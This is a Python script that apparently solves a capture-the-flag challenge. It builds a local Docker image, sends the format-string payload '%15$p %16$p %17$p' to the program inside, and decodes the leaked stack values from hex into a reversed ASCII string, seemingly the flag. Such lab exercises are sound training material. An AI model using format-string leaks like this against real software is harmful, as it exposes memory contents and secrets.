import subprocess
import re

# Specify the tag for the Docker image
tag_var = "ms_tag"

# Step 1: Build the Docker image with the specified tag
print("Starting the Docker build process...")
try:
    build_result = subprocess.run(['docker', 'build', '-t', tag_var, '.'], capture_output=True, text=True)
    if build_result.returncode != 0:
        print(f"Error building Docker image:\n{build_result.stderr}")
        exit(1)
    else:
        print("Docker image built successfully with tag:", tag_var)
except Exception as e:
    print(f"Error during Docker build: {e}")
    exit(1)

# Step 2: Run the Docker container using the specified tag and provide `%15$p %16$p %17$p` input
print("Running the Docker container with tag:", tag_var)
try:
    # Use single quotes around the input to prevent shell expansion of `$`
    result = subprocess.run(
        f"echo '%15$p %16$p %17$p' | docker run -i {tag_var}",
        shell=True, capture_output=True, text=True
    )
    output = result.stdout.strip()  # Capture and strip any extra whitespace or newlines
    print("Raw output from Docker container:\n", output)
except Exception as e:
    print(f"Error running Docker container: {e}")
    exit(1)

# Step 3: Process the output to find the hex values (assuming they are in the format 0x...)
print("Processing output...")
hex_values = re.findall(r"0x[0-9a-fA-F]+", output)  # Extract all hex values in the output

# Reverse the order of hex values to match the expected result pattern
hex_values.reverse()

ascii_result = ""

try:
    # Step 4: Convert each hex value to ASCII and concatenate
    for hex_value in hex_values:
        ascii_part = bytearray.fromhex(hex_value[2:]).decode()  # Strip the "0x" prefix
        ascii_result += ascii_part
        print(f"Converted '{hex_value}' to ASCII segment: '{ascii_part}'")

    print("Combined ASCII result:", ascii_result)

    # Step 5: Reverse the ASCII string to get the final result
    reversed_result = ascii_result[::-1]
    print("Reversed ASCII result:", reversed_result)

except ValueError as ve:
    print(f"Error converting hex to ASCII: {ve}")
